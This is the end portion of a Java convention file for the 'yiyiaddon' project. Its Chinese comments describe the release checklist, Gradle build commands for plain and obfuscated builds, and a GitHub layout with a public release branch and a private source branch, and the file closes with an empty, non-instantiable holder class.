//   2. jar 文件名自动跟随版本号（archiveFileName 控制）
//   3. 映射文件已生成到 Obfuscation/映射存档/
//   4. 映射文件已提交 Git
//   5. Release 页面已上传 jar 和 SHA256
//   6. Release notes 已说明混淆配置变化
//   ✗ 禁止手动改 jar 文件名，必须通过 libs.versions.toml 改版本号。
//
// ════════════════════════════════════════════════════════════════════════════
//  第九章 · 构建命令与环境
// ════════════════════════════════════════════════════════════════════════════
//
//   需要 JDK 25（不是 Java 21）。
//
//   powershell
//   $env:JAVA_HOME = (Get-Command java).Source | Split-Path | Split-Path
//   .\gradlew.bat buildPersonal
//
//   gradlew runClient       - 开发客户端测试
//   gradlew buildPersonal   - 个人测试版（未混淆）
//   gradlew buildOfficial   - 官方发布版（混淆 + 映射文件）
//
// ════════════════════════════════════════════════════════════════════════════
//  第十章 · GitHub 仓库结构与 Release 模板
// ════════════════════════════════════════════════════════════════════════════
//
//   仓库地址：https://github.com/fxjcangku/26.1.2
//   分支结构：
//     main (公开)    - 只有 README.md + Release 页面，外界可见
//     source (私密)  - 完整源码，不公开
//   重要页面：
//     发布页面（公开）：https://github.com/fxjcangku/26.1.2/releases
//     源码分支（私密）：https://github.com/fxjcangku/26.1.2-source
//
//   工作流程：
//     1. 本地切换到 source 分支：git checkout source
//     2. 开发完成后构建混淆版：gradlew buildOfficial
//     3. 保存映射文件：build/obfuscation-mapping-v{版本}.txt
//     4. 发布到 Release 页面（只上传 jar，不上传源码）
//     5. 如需更新 README：切 main 分支编辑并推送
//     6. 用户自动收到更新提示（YiyiaddonWelcomeService）
//
//   分支保护：
//     main 分支：删除了所有源码文件，只保留 README.md + LICENSE
//     source 分支：完整源码 + Personal jar，永远不公开
//     本地开发：始终在 source 分支工作
//
//   Release 标签格式：v{版本} 或 v{版本}-beta{n}
//   客户端只显示前 3 条无序列表项作为更新提示，最重要的更新写在前面。

/**
 * yiyiaddon 项目开发规范载体。
 *
 * <p>本类不包含任何业务逻辑，仅作为「规范唯一正本」存在——所有开发习惯、
 * 调试协议、API 约定、分类铁律都写在类体上方的中文注释里。AI 助手与开发者
 * 动手前必须先完整阅读本文件注释。</p>
 *
 * @author yiyijia
 */
public final class YiyiaddonConvention {

    /** 私有构造，禁止实例化。 */
    private YiyiaddonConvention() {
        // 规范载体类，不提供实例。
    }
}